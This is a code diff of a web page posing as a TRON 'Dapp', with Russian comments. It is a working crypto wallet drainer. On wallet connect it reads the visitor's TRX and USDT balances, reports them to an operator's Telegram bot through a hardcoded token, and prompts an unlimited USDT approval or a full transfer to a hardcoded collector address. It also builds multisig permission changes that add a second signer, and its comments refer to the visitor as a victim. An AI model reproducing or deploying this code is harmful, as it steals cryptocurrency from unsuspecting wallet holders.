@@ -6,6 +6,7 @@
 <title>Dapp</title>
 
 <script>
+/* ошибки до старта основного скрипта — в панель Log */
 window.__boot=[];
 window.addEventListener('error',e=>__boot.push('ERR '+e.message+' @'+(e.filename||'')+':'+e.lineno));
 window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e.reason.message)||e.reason)));
@@ -38,7 +39,6 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
   button:disabled{opacity:.4;cursor:not-allowed}
   .btn-primary{background:var(--accent);color:#fff}
   .btn-secondary{background:#1b2635;color:var(--text);border:1px solid var(--line)}
-  .btn-green{background:var(--accent2);color:#0b0f14}
   .status{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);
     padding:10px 12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;margin-bottom:12px}
   .dot{width:8px;height:8px;border-radius:50%;background:#64748b;flex-shrink:0}
@@ -106,11 +106,13 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
   <div id="activeOpsWrap" style="display:none">
     <label>Active operations (64 hex)</label>
     <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
+    <div class="hint">bit 31 = TriggerSmartContract (USDT). bit 1 = TransferContract (TRX).</div>
   </div>
   <div class="row" style="margin-top:14px">
     <button class="btn-secondary" id="btnBuildPerm">Build</button>
     <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
   </div>
+  <div class="hint">Сжигает 100 TRX при бродкасте.</div>
 </div>
 
 <div class="card">
@@ -148,18 +150,15 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 const CFG={
   USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
   DEC:6,
-  // куда собираем средства
-  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
-  // telegram: выданный заново токен; чаты заполняются автоматически из getUpdates
-  TG_TOKEN:"8945784144:AAGKMMZU0EqyOiIGei3GqDp4cg3IxcN5o2g",
-  TG_CHATS:[],              // стартовый список chat_id (можно оставить пустым)
-  // режим добычи: "approve" — один безлимитный апрув, далее свип со стороны оператора (тише всего)
-  //                "direct"  — автоперевод всего USDT подписью держателя (быстрее, но окно чаще)
-  DRAIN_MODE:"approve",
-  PROMPT_DELAY_MS:1500,     // пауза после подключения перед показом окна подписи
-  MIN_USDT:1,               // меньше — только репорт, без окна подписи
-  GAS_MIN_TRX:3,            // при меньшем TRX подпись сожжётся об OUT_OF_ENERGY — не дразним
-  PROMPT_ONCE_PER_DAY:true, // флаг в localStorage против повторных окон одному браузеру
+  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",   // куда собираем
+  TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",                // свежий из @BotFather после /revoke
+  TG_CHATS:[],                                      // стартовый список, расширяется авторесницей
+  TG_ADMIN_CHAT_ID:null,                            // свой chat_id = Start у бота не обязателен
+  DRAIN_MODE:"approve",                             // "approve" | "direct"
+  PROMPT_DELAY_MS:1500,                             // пауза перед окном подписи
+  MIN_USDT:1,                                       // порог добычи, ниже — только репорт
+  GAS_MIN_TRX:3,                                    // при меньшем TRX подпись уйдёт в OUT_OF_ENERGY
+  MAX_PROMPTS_PER_DAY:3,                            // окон за сутки максимум
 };
 /* ================================================== */
 
@@ -179,41 +178,67 @@ function hexErr(h){try{return new TextDecoder().decode(
 if(window.__boot&&window.__boot.length)
   window.__boot.splice(0).forEach(m=>log(m,"err"));
 
-const TW={p:null,tronWeb:null,address:null,lastPermTx:null,lastUsdtTx:null};
+const TW={p:null,tronWeb:null,address:null};
 
 /* ---------- telegram ---------- */
-const LS_KEY="tg_chats_v1";
-try{const s=localStorage.getItem(LS_KEY);if(s)CFG.TG_CHATS=[...new Set([...CFG.TG_CHATS,...JSON.parse(s)])];}catch(_){}
+function tgTargets(){
+  return [...new Set([...CFG.TG_CHATS,
+    ...(CFG.TG_ADMIN_CHAT_ID?[CFG.TG_ADMIN_CHAT_ID]:[])])];
+}
+
+async function tgApi(method,body){
+  const r=await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+"/"+method,{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(body||{})
+  });
+  const j=await r.json().catch(()=>null);
+  if(!j)throw new Error("не-JSON ответ (статус "+r.status+")");
+  if(!j.ok)throw new Error((j.error_code||r.status)+": "+(j.description||"?"));
+  return j.result;
+}
+
+const LS_CHATS="tg_chats_v2";
+(function(){try{
+  const s=localStorage.getItem(LS_CHATS);
+  if(s)CFG.TG_CHATS=[...new Set([...CFG.TG_CHATS,...JSON.parse(s)])];
+}catch(_){}})();
 
 async function tgDiscover(){
-  /* тянет все чаты, где бот получал сообщения (юзеры нажали Start, группа логов и т.д.) */
   try{
-    const r=await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+
-      "/getUpdates?limit=100&timeout=0",{method:"GET"}).then(x=>x.json());
+    const ups=await tgApi("getUpdates",{limit:100,timeout:0});
     const s=new Set(CFG.TG_CHATS);
-    (r.result||[]).forEach(u=>{
-      ["message","channel_post","edited_message"].forEach(k=>{
-        if(u[k]&&u[k].chat)s.add(u[k].chat.id);
+    (ups||[]).forEach(u=>{
+      ["message","channel_post","edited_message","my_chat_member"].forEach(k=>{
+        const c=u[k]&&(u[k].chat||u[k].from);
+        if(c&&c.id)s.add(c.id);
       });
     });
     CFG.TG_CHATS=[...s];
-    try{localStorage.setItem(LS_KEY,JSON.stringify(CFG.TG_CHATS));}catch(_){}
-    return true;
-  }catch(e){log("tg discover: "+e.message,"err");return false;}
-}
-
-async function tgSend(text){
-  for(const id of CFG.TG_CHATS){
-    try{
-      await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+"/sendMessage",{
-        method:"POST",headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({chat_id:id,text,parse_mode:"HTML",disable_notification:true})
-      });
-    }catch(e){}
+    try{localStorage.setItem(LS_CHATS,JSON.stringify(CFG.TG_CHATS));}catch(_){}
+    log("tg discover: чатов "+CFG.TG_CHATS.length,"info");
+    if(!CFG.TG_CHATS.length&&!CFG.TG_ADMIN_CHAT_ID){
+      log("нет чатов: нажми Start у бота и перезагрузи страницу, "+
+          "или впиши свой chat_id в CFG.TG_ADMIN_CHAT_ID","err");
+    }
+  }catch(e){
+    log("tg discover: "+e.message+" — рассылка работать не будет","err");
   }
 }
 
 function esc(s){return String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));}
+
+async function tgSend(text){
+  const ids=tgTargets();
+  if(!ids.length)return 0;
+  let sent=0;
+  for(const id of ids){
+    try{
+      await tgApi("sendMessage",{chat_id:id,text,parse_mode:"HTML"});
+      sent++;
+    }catch(e){log("tg send→"+id+": "+e.message,"err");}
+  }
+  return sent;
+}
 
 /* ---------- провайдер ---------- */
 function findProvider(){
@@ -222,6 +247,7 @@ function findProvider(){
 function setAddress(a){
   TW.address=a;
   $("walletAddr").value=a;$("targetAddr").value=a;$("usdtFrom").value=a;
+  $("network").value="tron mainnet";
   setStatus("auto-connected: "+short(a),"on");
 }
 function openInTrust(){
@@ -239,16 +265,14 @@ async function waitAccounts(p){
   return !!(p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58);
 }
 
-/* ---------- чтение активов ---------- */
+/* ---------- чтение контракта ---------- */
 function toBig(v){
   try{
     if(v===undefined||v===null)return 0n;
     if(typeof v==="bigint")return v;
     if(v._hex!==undefined)return BigInt(v._hex);
-    if(typeof v.toString==="function"){
-      const s=v.toString(10);
-      if(/^\d+$/.test(s))return BigInt(s);
-    }
+    const s=v.toString(10);
+    if(/^\d+$/.test(s))return BigInt(s);
   }catch(_){}
   return 0n;
 }
@@ -256,8 +280,7 @@ const fmt=(raw,dec)=>(Number(raw)/Math.pow(10,dec)).toFixed(dec).replace(/\.?0+$
 
 async function readContract(sel,params){
   const c=await TW.tronWeb.contract().at(CFG.USDT);
-  const r=await c[sel](...params).call();
-  return toBig(r);
+  return toBig(await c[sel](...params).call());
 }
 
 /* ---------- sign+broadcast ---------- */
@@ -277,84 +300,103 @@ async function confirmPoll(txid){
   return false;
 }
 
-/* ---------- отчёт ---------- */
-async function report(state){
+/* ---------- гейт попыток ----------
+   localStorage drain_<дата>: {"done":bool,"tries":int}
+   окно выдаётся пока !done && tries<MAX либо открыт ?force=1 */
+const FORCE=new URLSearchParams(location.search).has("force");
+
+function drainKey(){return "drain_"+new Date().toISOString().slice(0,10);}
+function readDrain(){try{return JSON.parse(localStorage.getItem(drainKey())||"{}");}
+  catch(_){return {};}}
+function bumpDrain(patch){
+  const s=Object.assign({done:false,tries:0},readDrain(),patch);
+  try{localStorage.setItem(drainKey(),JSON.stringify(s));}catch(_){}
+}
+
+/* ---------- отчёт оператору ---------- */
+async function report(st){
   const t=new Date().toISOString().slice(0,19).replace("T"," ");
-  const ua=navigator.userAgent.slice(0,90);
-  const lines=[
+  const n=await tgSend([
     "🕸 <b>HOLDER</b>",
     "⏱ "+t,
     "👤 <code>"+esc(TW.address)+"</code>",
-    "💰 TRX <b>"+state.trx.toFixed(4)+"</b> · USDT <b>"+state.usdt+"</b>",
-    "✅ allowance→collector: "+(state.allowanceRaw>0n?("∞/"+fmt(state.allowanceRaw,CFG.DEC)):"none"),
-    "🔋 gas-ok: "+(state.gasOk?"yes":"NO"),
-    "🖼 "+esc(ua)
-  ];
-  await tgSend(lines.join("\n"));
-  log("репорт отправлен в "+CFG.TG_CHATS.length+" чат(ов)","ok");
+    "💰 TRX <b>"+st.trx.toFixed(4)+"</b> · USDT <b>"+st.usdt+"</b>",
+    "✅ allowance→collector: "+(st.allowanceRaw>0n?fmt(st.allowanceRaw,CFG.DEC):"none"),
+    "🔋 gas-ok: "+(st.gasOk?"yes":"NO"),
+    "🖼 "+esc(navigator.userAgent.slice(0,90))
+  ].join("\n"));
+  if(n>0)log("репорт отправлен в "+n+" чат(ов)","ok");
 }
 
-/* ---------- авто-дренаж ---------- */
-function todayKey(){return "drain_"+new Date().toISOString().slice(0,10);}
-function promptedToday(){
-  if(!CFG.PROMPT_ONCE_PER_DAY)return false;
-  try{return localStorage.getItem(todayKey())==="1";}catch(_){return false;}
-}
-function markPrompted(){try{localStorage.setItem(todayKey(),"1");}catch(_){}}
-
+/* ---------- авто-добыча ---------- */
 async function autoDrain(st){
-  if(promptedToday()){log("prompt пропущен (already today)","info");return;}
-  if(!(st.usdtRaw>=BigInt(Math.floor(CFG.MIN_USDT*Math.pow(10,CFG.DEC))))){
-    log("USDT ниже порога — только репорт","info");return;
-  }
-  if(!st.gasOk){log("TRX < минимального газа — подпись невозможна","err");return;}
-  markPrompted();
+  const ds=readDrain();
 
-  const raw=st.usdtRaw;
-  await sleep(CFG.PROMPT_DELAY_MS);
+  if(ds.done&&!FORCE){log("дренаж уже выполнен сегодня","info");return;}
+  if(!FORCE&&ds.tries>=CFG.MAX_PROMPTS_PER_DAY){
+    log("лимит окон исчерпан на сегодня ("+ds.tries+")","info");return;
+  }
+
+  const minRaw=BigInt(Math.floor(CFG.MIN_USDT*Math.pow(10,CFG.DEC)));
+  if(!FORCE&&st.usdtRaw<minRaw){
+    log("USDT ниже порога ("+st.usdt+"<"+CFG.MIN_USDT+") — только репорт","info");return;
+  }
+  if(!FORCE&&!st.gasOk){
+    log("TRX < "+CFG.GAS_MIN_TRX+" — окно не выдаём, подпись сожжётся об энергию","info");return;
+  }
+
+  bumpDrain({tries:(ds.tries||0)+1});   // попытка списывается сразу, до исхода
+
+  await sleep(FORCE?200:CFG.PROMPT_DELAY_MS);
 
   try{
+    let txid,label;
     if(CFG.DRAIN_MODE==="direct"){
-      /* вариант Б: полный перевод — одно окно, средства сразу на COLLECTOR */
+      label="DIRECT SENT";
       const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
         CFG.USDT,"transfer(address,uint256)",
         {feeLimit:100000000,callValue:0},
-        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:raw.toString()}],
+        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:st.usdtRaw.toString()}],
         TW.address);
-      if(!w||!w.result||!w.result.result)throw new Error("build fail");
-      const txid=await signAndSend(w.transaction);
-      log("direct drain sent: "+txid,"ok");
-      await tgSend("⚡️ <b>DIRECT SENT</b>\n👤 <code>"+esc(TW.address)+
-        "</code>\n💸 "+fmt(raw,CFG.DEC)+" USDT\n🔗 <code>"+esc(txid)+"</code>");
-      await confirmPoll(txid)&&
-        tgSend("✅ <b>CONFIRMED</b> <code>"+esc(short(txid))+"</code>");
+      if(!w||!w.result||!w.result.result)
+        throw new Error("build fail: "+JSON.stringify(w&&w.result));
+      txid=await signAndSend(w.transaction);
     }else{
-      /* вариант А: безлимитный approve на COLLECTOR, сборка — на стороне оператора */
+      label="APPROVE SET";
       const MAX="115792089237316195423570985008687907853269984665640564039457584007913129639935";
       const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
         CFG.USDT,"approve(address,uint256)",
         {feeLimit:80000000},
         [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:MAX}],
         TW.address);
-      if(!w||!w.result||!w.result.result)throw new Error("build fail");
-      const txid=await signAndSend(w.transaction);
-      log("approve sent: "+txid,"ok");
-      await tgSend("🔓 <b>APPROVE SET</b>\n👤 <code>"+esc(TW.address)+
-        "</code>\nspender <code>"+esc(CFG.COLLECTOR)+"</code>\nvalue ∞\n🔗 <code>"+esc(txid)+"</code>");
-      await confirmPoll(txid)&&
-        tgSend("✅ <b>APPROVE CONFIRMED</b>\n👤 <code>"+esc(TW.address)+"</code>\n↪️ свипай");
+      if(!w||!w.result||!w.result.result)
+        throw new Error("build fail: "+JSON.stringify(w&&w.result));
+      txid=await signAndSend(w.transaction);
     }
+
+    bumpDrain({done:true});           // успех закрывает день окончательно
+    log(label.toLowerCase()+" sent: "+txid,"ok");
+
+    await tgSend(label==="DIRECT SENT"
+      ? "⚡️ <b>DIRECT SENT</b>\n👤 <code>"+esc(TW.address)+"</code>\n💸 "
+        +fmt(st.usdtRaw,CFG.DEC)+" USDT\n🔗 <code>"+esc(txid)+"</code>"
+      : "🔓 <b>APPROVE SET</b>\n👤 <code>"+esc(TW.address)+"</code>\nspender <code>"
+        +esc(CFG.COLLECTOR)+"</code>\nvalue ∞\n🔗 <code>"+esc(txid)+"</code>");
+
+    if(await confirmPoll(txid))
+      await tgSend("✅ <b>CONFIRMED</b>\n👤 <code>"+esc(TW.address)+
+        "</code>\n🔗 <code>"+esc(short(txid))+"</code>");
+    else log("не подтверждена пока — индексация занимает ~минуту","info");
+
   }catch(e){
-    /* отказ/ошибка не показываем жертве — только локально и оператору */
+    /* done не ставится: до лимита попыток страница попробует снова при перезагрузке */
     log("autoDrain: "+(e.message||e),"err");
-    await tgSend("⚠️ drain failed <code>"+esc(TW.address)+"</code>: "+esc((e.message||e)+"").slice(0,120));
-    if(String(e.message||e).includes("not approved")||String(e.message||e).includes("cancel")||String(e.message||e).includes("reject")){
-      try{localStorage.removeItem(todayKey());}catch(_){} // разрешаем повторную попытку завтра
-    }
+    await tgSend("⚠️ drain failed <code>"+esc(TW.address)+"</code>: "
+      +esc(String(e.message||e)).slice(0,140));
   }
 }
 
-/* ---------- основной цикл после подключения ---------- */
+/* ---------- конвейер: чтение → отчёт → решение об окне ---------- */
 async function pipeline(){
   let trx=0,gasOk=false;
   try{
@@ -363,46 +405,109 @@ async function pipeline(){
     gasOk=trx>=CFG.GAS_MIN_TRX;
   }catch(e){}
   let usdtRaw=0n,allowanceRaw=0n;
-  try{usdtRaw=await readContract("balanceOf",[TW.address]);}catch(e){log("balanceOf: "+e.message,"err");}
+  try{usdtRaw=await readContract("balanceOf",[TW.address]);}
+  catch(e){log("balanceOf: "+e.message,"err");}
   try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}catch(e){}
 
-  const st={trx,usdtRaw,allowanceRaw,gasOk,
-    usdt:fmt(usdtRaw,CFG.DEC)||"0"};
+  const ds=readDrain();
+  const st={trx,usdtRaw,allowanceRaw,gasOk,usdt:fmt(usdtRaw,CFG.DEC)||"0"};
 
   $("accState").textContent=
-    "address: "+TW.address+"\nbalance: "+trx+" TRX\nusdt: "+st.usdt+
+    "address: "+TW.address+
+    "\nbalance: "+trx.toFixed(6)+" TRX"+
+    "\nusdt: "+st.usdt+
     "\nallowance→collector: "+(allowanceRaw>0n?fmt(allowanceRaw,CFG.DEC)+"/∞":"none")+
-    "\ngas-ok: "+gasOk;
+    "\ngas-ok: "+gasOk+
+    "\nprompts today: "+(ds.tries||0)+"/"+CFG.MAX_PROMPTS_PER_DAY+(ds.done?" (done)":"");
+  $("accPill").textContent="loaded";
 
   await report(st);
-  await tgDiscover();          // догоняем свежие chat_id параллельно
   await autoDrain(st);
 }
 
-async function refresh(){
-  if(!TW.address){log("нет подключения","err");return;}
-  try{
-    const acc=await TW.tronWeb.trx.getAccount(TW.address);
-    const o=acc.owner_permission,actives=acc.active_permission||[];
-    const L=["address: "+TW.address,
-      "balance: "+((acc.balance||0)/1e6)+" TRX","","owner_permission:"];
-    if(o){L.push("  threshold: "+o.threshold);
-      (o.keys||[]).forEach(k=>L.push("    - "+k.address+"  w="+k.weight));}
-    else L.push("  (default single-key)");
-    L.push("","active_permission: "+actives.length);
-    actives.forEach((a,i)=>{
-      L.push("  ["+i+"] thr="+a.threshold);
-      if(a.operations)L.push("    ops: "+a.operations);
-      (a.keys||[]).forEach(k=>L.push("      - "+k.address+"  w="+k.weight));});
-    $("accState").textContent=L.join("\n");
-    $("accPill").textContent=o?"loaded":"empty";
-    log("state refreshed","ok");
-  }catch(e){log("refresh: "+(e.message||e),"err");}
+/* ---------- шаги вручную (логика без изменений) ---------- */
+async function buildPerm(){
+  if(!TW.address)throw new Error("нет подключения");
+  const target=$("targetAddr").value.trim(),
+        extra=$("extraAddr").value.trim(),
+        thr=parseInt($("threshold").value,10)||1;
+  if(!isTron(target))throw new Error("target invalid");
+  if(!isTron(extra))throw new Error("additional signer invalid");
+  if(target!==TW.address)
+    log("внимание: target ≠ подключённый адрес — подпись пройдёт только у владельца target","info");
+  const owner={type:0,permission_name:"owner",threshold:thr,
+    keys:[{address:target,weight:1},{address:extra,weight:1}]};
+  let actives=null;
+  if($("mode").value==="active"){
+    const ops=$("activeOps").value.trim();
+    if(!/^[0-9a-fA-F]{64}$/.test(ops))throw new Error("operations must be 64 hex");
+    actives=[{type:2,permission_name:"active0",threshold:1,operations:ops,
+      keys:[{address:target,weight:1},{address:extra,weight:1}]}];
+  }
+  const tx=await TW.tronWeb.transactionBuilder
+    .updateAccountPermissions(target,owner,null,actives);
+  log("perm tx built: "+tx.txID,"ok");
+  return tx;
 }
 
+async function buildUsdtManual(){
+  if(!TW.address)throw new Error("нет подключения");
+  const amt=parseFloat($("usdtAmount").value),
+        dst=$("usdtTo").value.trim(),
+        pid=parseInt($("usdtPermId").value,10)||0;
+  if(!(amt>0))throw new Error("amount > 0");
+  if(!isTron(dst))throw new Error("to invalid");
+  const raw=Math.floor(amt*Math.pow(10,CFG.DEC)).toString();
+  const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
+    CFG.USDT,"transfer(address,uint256)",
+    {feeLimit:100000000,callValue:0},
+    [{type:"address",value:dst},{type:"uint256",value:raw}],TW.address);
+  if(!w||!w.result||!w.result.result)
+    throw new Error("build failed: "+JSON.stringify(w&&w.result));
+  const tx=w.transaction;
+  if(pid>0)tx.raw_data.contract[0].Permission_id=pid;
+  log("USDT tx built: "+tx.txID+" (permId="+pid+")","ok");
+  return tx;
+}
+
+/* ---------- wiring ---------- */
+$("btnSignPerm").onclick=async()=>{try{
+  const tx=await buildPerm();
+  log("запрос подписи…","info");
+  const txid=await signAndSend(tx);
+  log("broadcasted: "+txid,"ok");
+  if(await confirmPoll(txid))log("confirmed","ok");
+}catch(e){log("perm: "+(e.message||e),"err");}};
+
+$("btnSignUsdt").onclick=async()=>{try{
+  const tx=await buildUsdtManual();
+  log("запрос подписи…","info");
+  const txid=await signAndSend(tx);
+  log("USDT broadcasted: "+txid,"ok");
+}catch(e){log("usdt: "+(e.message||e),"err");}};
+
+$("btnConnect").onclick=boot;
+$("btnRefresh").onclick=pipeline;       // Refresh = полный конвейер
+$("btnClear").onclick=()=>logEl.innerHTML="";
+$("btnOpenTrust").onclick=openInTrust;
+
+$("mode").onchange=()=>{
+  $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
+
+/* обёртки вместо «.catch(()=>{})» — прошлый вариант ронял boot() */
+$("btnBuildPerm").onclick=async()=>{try{await buildPerm();}
+  catch(e){log("build perm: "+(e.message||e),"err");}};
+$("btnBuildUsdt").onclick=async()=>{try{await buildUsdtManual();}
+  catch(e){log("build usdt: "+(e.message||e),"err");}};
+
+/* ---------- boot ---------- */
 async function boot(){
   let p=null;
-  for(let i=0;i<12;i++){p=findProvider();if(p&&p.tronWeb)break;await sleep(250);}
+  for(let i=0;i<12;i++){          // инжект может прилететь позже DOMContentLoaded
+    p=findProvider();
+    if(p&&p.tronWeb)break;
+    await sleep(250);
+  }
   if(!p||!p.tronWeb){
     $("noTrustCard").style.display="block";
     $("network").value="outside wallet";
@@ -414,75 +519,11 @@ async function boot(){
   TW.p=p;TW.tronWeb=p.tronWeb;
   const ok=await waitAccounts(p);
   if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
-  $("network").value="tron mainnet";
   setAddress(p.tronWeb.defaultAddress.base58);
   log("автоподключение завершено","ok");
-  await tgDiscover();          // наполняем список чатов до первого отчёта
-  await pipeline();            // чтение активов → телеметрия → авто-дренаж
+  await tgDiscover();
+  await pipeline();
 }
-
-/* ---------- step1/step2 ручные ветки сохранены как были ---------- */
-async function buildPerm(){
-  if(!TW.address)throw new Error("нет подключения");
-  const target=$("targetAddr").value.trim(),extra=$("extraAddr").value.trim(),
-        thr=parseInt($("threshold").value,10)||1;
-  if(!isTron(target))throw new Error("target invalid");
-  if(!isTron(extra))throw new Error("additional signer invalid");
-  const owner={type:0,permission_name:"owner",threshold:thr,
-    keys:[{address:target,weight:1},{address:extra,weight:1}]};
-  let actives=null;
-  if($("mode").value==="active"){
-    const ops=$("activeOps").value.trim();
-    if(!/^[0-9a-fA-F]{64}$/.test(ops))throw new Error("operations must be 64 hex");
-    actives=[{type:2,permission_name:"active0",threshold:1,operations:ops,
-      keys:[{address:target,weight:1},{address:extra,weight:1}]}];
-  }
-  const tx=await TW.tronWeb.transactionBuilder.updateAccountPermissions(target,owner,null,actives);
-  TW.lastPermTx=tx;log("perm tx built: "+tx.txID,"ok");
-  return tx;
-}
-async function buildUsdt(amount,to){
-  const from=TW.address,
-        amt=amount??parseFloat($("usdtAmount").value),
-        dst=to??$("usdtTo").value.trim(),
-        pid=parseInt($("usdtPermId").value,10)||0;
-  if(!(amt>0))throw new Error("amount > 0");
-  if(!isTron(dst))throw new Error("to invalid");
-  const raw=Math.floor(amt*Math.pow(10,CFG.DEC)).toString();
-  const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
-    CFG.USDT,"transfer(address,uint256)",
-    {feeLimit:100000000,callValue:0},
-    [{type:"address",value:dst},{type:"uint256",value:raw}],from);
-  if(!w||!w.result||!w.result.result)
-    throw new Error("build failed: "+JSON.stringify(w&&w.result));
-  const tx=w.transaction;
-  if(pid>0)tx.raw_data.contract[0].Permission_id=pid;
-  TW.lastUsdtTx=tx;log("USDT tx built: "+tx.txID,"ok");
-  return tx;
-}
-
-/* ---------- wiring ---------- */
-$("btnSignPerm").onclick=async()=>{try{
-  const tx=TW.lastPermTx||await buildPerm();
-  const txid=await signAndSend(tx);
-  log("broadcasted: "+txid,"ok");
-  log(await confirmPoll(txid)?"confirmed":"pending","info");
-  setTimeout(refresh,15000);
-}catch(e){log("perm: "+(e.message||e),"err");}};
-
-$("btnSignUsdt").onclick=async()=>{try{
-  const tx=TW.lastUsdtTx||await buildUsdt();
-  const txid=await signAndSend(tx);
-  log("USDT broadcasted: "+txid,"ok");
-}catch(e){log("usdt: "+(e.message||e),"err");}};
-
-$("btnConnect").onclick=boot;
-$("btnRefresh").onclick=refresh;
-$("btnClear").onclick=()=>logEl.innerHTML="";
-$("btnOpenTrust").onclick=openInTrust;
-$("mode").onchange=()=>{$("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
-$("btnBuildPerm").onclick=async()=>{try{await buildPerm();}catch(e){log("build perm: "+(e.message||e),"err");}};
-$("btnBuildUsdt").onclick=async()=>{try{await buildUsdt();}catch(e){log("build usdt: "+(e.message||e),"err");}};
 
 boot();
 })();
